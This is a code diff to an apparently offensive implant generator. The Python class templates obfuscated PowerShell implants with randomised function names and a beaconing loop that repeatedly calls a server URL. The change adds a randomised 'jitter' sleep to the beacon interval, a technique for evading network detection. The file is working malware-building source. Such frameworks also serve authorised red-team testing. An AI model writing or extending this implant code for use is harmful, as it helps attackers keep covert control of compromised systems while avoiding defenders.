@@ -12,6 +12,7 @@ class ImplantGenerator:
     JinjaRandomisedArgs = {"rnd_function": "aaaaaa",
                            "obf_remote_play_audio": "RemotePlayAudio",
                            "obf_sleep": "sleep",
+                           "obf_start_sleep": "start_sleep",
                            "obf_collect_sysinfo": "collect_sysinfo",
                            "obf_http_conn": "http-connection",
                            "obf_https_conn": "https-connection",
@@ -86,13 +87,19 @@ function {{ ron.obf_https_conn }}(){
     return $bb
 }
     '''
+    start_sleep = '''
+function {{ ron.obf_start_sleep }}($a){
+    sleep (Get-Random -Minimum ($a *0.90) -Maximum ($a *1.05))
+}
+    '''
 
     implant_main = '''
 start-sleep({{ initial_sleep }})
 ${{ ron.obf_sleep }}={{ beacon }}
 $sgep = "{{url}}"
 while($true){
-    start-sleep(${{ ron.obf_sleep }})
+    # start-sleep(${{ ron.obf_sleep }})
+    {{ ron.obf_start_sleep }}(${{ ron.obf_sleep }})
     try {
         {{ proto_core }}
     }
@@ -145,7 +152,8 @@ while($true){
                              self.random_function,
                              self.update_implant,
                              self.fde_func_a,
-                             self.fde_func_b]
+                             self.fde_func_b,
+                             self.start_sleep]
 
         # Checks which protocols should be embedded into the implant.
         if implant_data['comms_http'] is not None:
